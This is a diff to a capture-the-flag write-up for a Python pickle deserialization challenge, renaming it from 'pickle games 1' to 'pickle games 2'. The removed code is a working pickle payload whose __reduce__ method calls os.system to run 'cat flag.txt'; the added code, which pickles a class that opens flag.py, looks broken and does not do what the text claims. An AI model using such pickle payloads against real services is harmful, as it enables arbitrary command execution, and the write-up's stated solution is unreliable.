@@ -1,4 +1,4 @@
-# pickle games 1
+# pickle games 2
 
 ## Description:
 
@@ -23,19 +23,18 @@ Reading the script, we found that the input is passed to a `check` function, and
 
 ## Solving the challenge:
 
-What I did is I used the existing `FLAG` that's already imported, and using the `__init__` method, I read the file `flag.py`, in other words: I used the `FLAG` to read the flag.
+What I did is I used the existing `FLAG` class that's already imported, and using the `__init__` method, I read the file `flag.py`, in other words: I used the `FLAG` to read the flag.
 
 ![meme](meme.jpg)
 
 ```py
 import pickle
 
-class GetFlag():
-    def __reduce__(self):
-        command = ('cat flag.txt')
-        return os.system, (command,)
-
-pickled = pickle.dumps(GetFlag())
+class FLAG:
+    def __init__(self):
+        with open('flag.py') as json_file:
+            print(json_file)
+pickled = pickle.dumps(FLAG)
 print(pickled.hex())
 ```
 
